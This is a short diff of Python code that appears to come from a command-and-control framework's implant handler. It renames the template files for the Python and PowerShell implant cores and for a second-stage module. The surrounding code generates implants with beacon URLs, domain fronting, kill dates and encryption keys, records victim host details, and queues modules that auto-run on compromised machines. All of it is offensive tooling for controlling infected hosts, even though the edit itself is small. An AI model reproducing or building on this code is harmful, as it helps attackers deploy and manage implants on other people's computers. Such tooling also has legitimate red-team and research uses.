@@ -41,9 +41,9 @@ NEWKEY8839394%s4939388YEKWEN
 IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDate, self.Sleep, self.Key, self.AllBeaconImages)
     with open("%spy_dropper.py" % (PayloadsDirectory), 'rb') as f:
         self.PythonImplant = base64.b64encode(f.read())
-    py_implant_core = open("%s/PyImplant-Core.py" % FilesDirectory, 'r').read()
+    py_implant_core = open("%s/Implant-Core.py" % FilesDirectory, 'r').read()
     self.PythonCore = py_implant_core % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Key, self.RandomURI, self.UserAgent)
-    ps_implant_core = open("%s/PSImplant-Core.ps1" % FilesDirectory, 'r').read()
+    ps_implant_core = open("%s/Implant-Core.ps1" % FilesDirectory, 'r').read()
     self.C2Core = ps_implant_core % (self.Key, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs)
 #Add all db elements
 
@@ -101,8 +101,8 @@ IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDa
     new_implant(self.RandomURI, self.User, self.Hostname, self.IPAddress, self.Key, self.FirstSeen, self.FirstSeen, self.PID, self.Proxy, self.Arch, self.Domain, self.Alive, self.Sleep, self.ModsLoaded, self.Pivot, self.Label)
 
   def autoruns(self):
-    new_task("loadmodule Core.ps1", "autoruns", self.RandomURI)
-    update_mods("Core.ps1", self.RandomURI)
+    new_task("loadmodule Stage2-Core.ps1", "autoruns", self.RandomURI)
+    update_mods("Stage2-Core.ps1", self.RandomURI)
     result = get_autoruns()
     if result:
       for autorun in result:
